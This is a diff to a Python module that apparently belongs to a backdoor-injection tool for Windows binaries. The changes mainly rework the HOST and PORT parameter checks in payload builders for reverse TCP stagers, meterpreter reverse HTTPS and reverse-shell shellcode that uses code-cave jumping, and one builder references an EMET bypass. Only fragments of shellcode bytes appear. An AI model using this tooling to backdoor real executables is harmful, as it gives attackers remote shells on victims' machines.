@@ -1,6 +1,6 @@
 '''
 
-Copyright (c) 2013-2014, Joshua Pitts
+Copyright (c) 2013-2015, Joshua Pitts
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
@@ -35,7 +35,6 @@ POSSIBILITY OF SUCH DAMAGE.
 ##########################################################
 #               BEGIN win32 shellcodes                   #
 ##########################################################
-import sys
 import struct
 from intelmodules import eat_code_caves
 
@@ -53,12 +52,10 @@ class winI32_shellcode():
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
         self.stackpreserve = "\x90\x90\x60\x9c"
         self.stackrestore = "\x9d\x61"
+        self.apis_needed = None
 
     def pack_ip_addresses(self):
         hostocts = []
-        if self.HOST is None:
-            print "This shellcode requires a HOST parameter -H"
-            return False
         for i, octet in enumerate(self.HOST.split('.')):
                 hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
@@ -73,8 +70,13 @@ class winI32_shellcode():
         Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
         windows/meterpreter/reverse_tcp payloads from metasploit.
         """
+
         if self.PORT is None:
-            print ("Must provide port")
+            print ("This payload requires the PORT parameter -P")
+            return False
+
+        if self.HOST is None:
+            print "This payload requires a HOST parameter -H"
             return False
 
         flItms['stager'] = True
@@ -335,8 +337,13 @@ class winI32_shellcode():
         Traditional meterpreter reverse https shellcode from metasploit
         modified to support cave jumping.
         """
+
         if self.PORT is None:
-            print ("Must provide port")
+            print ("This payload requires the PORT parameter -P")
+            return False
+
+        if self.HOST is None:
+            print "This payload requires a HOST parameter -H"
             return False
 
         flItms['stager'] = True
@@ -466,9 +473,15 @@ class winI32_shellcode():
         Modified metasploit windows/shell_reverse_tcp shellcode
         to enable continued execution and cave jumping.
         """
+
         if self.PORT is None:
-            print ("Must provide port")
+            print ("This payload requires the PORT parameter -P")
             return False
+
+        if self.HOST is None:
+            print "This payload requires a HOST parameter -H"
+            return False
+
         #breakupvar is the distance between codecaves
         breakupvar = eat_code_caves(flItms, 0, 1)
         self.shellcode1 = "\xfc\xe8"
@@ -531,16 +544,18 @@ class winI32_shellcode():
         http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/
         via @bannedit0 (twitter handle)
         """
+        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress']
+
+        for api in flItms['apis_needed']:
+            if api not in flItms:
+                return False
+
         if self.PORT is None:
-            print ("Must provide port")
+            print ("This payload requires the PORT parameter -P")
             return False
 
-        if 'LoadLibraryA' not in flItms:
-            print "[!] Binary does not have the LoadLibraryA API in IAT"
-            return False
-
-        if 'GetProcAddress' not in flItms:
-            print "[!] Binary does not have GetProcAddress API in IAT"
+        if self.HOST is None:
+            print "This payload requires a HOST parameter -H"
             return False
 
         self.shellcode1 = "\xfc"   # CLD
